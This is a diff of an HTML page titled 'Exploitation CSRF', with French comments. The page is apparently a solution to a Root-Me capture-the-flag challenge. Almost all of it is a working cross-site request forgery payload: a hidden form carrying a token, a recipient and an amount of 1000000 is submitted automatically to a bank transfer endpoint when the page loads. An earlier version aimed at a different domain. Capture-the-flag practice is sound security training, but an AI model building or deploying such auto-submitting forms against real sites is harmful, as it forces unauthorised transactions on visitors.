@@ -1,15 +1,25 @@
 <!DOCTYPE html>
-<html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exploitation CSRF</title>
+</head>
 <body>
-    <form id="csrf-form" action="https://bankme-v4.com/transfer/" method="POST">
-        <input type="hidden" name="recipient" value="zizi">
-        <input type="hidden" name="amount" value="10000">
-        <input type="hidden" name="token" value="6757059b4f9a22da000000">
+    <h1>Page Malveillante</h1>
+    <!-- Formulaire caché qui effectue le transfert -->
+    <form id="maliciousForm" action="https://bankme-4.challenges.pro.root-me.org/transfer/" method="POST">
+        <!-- Jeton CSRF (utiliser un jeton réel si nécessaire) -->
+        <input type="hidden" name="token" value="675712034f9a22da000001">
+        <!-- Destinataire et montant à transférer -->
+        <input type="hidden" name="recipient" value="google_fans"> <!-- Le destinataire est google_fans -->
+        <input type="hidden" name="amount" value="1000000"> <!-- Montant du transfert -->
     </form>
 
     <script>
-        // Soumettre le formulaire automatiquement
-        document.getElementById('csrf-form').submit();
+        // Soumettre automatiquement le formulaire malveillant dès que la page est chargée
+        document.getElementById('maliciousForm').submit();
     </script>
 </body>
 </html>
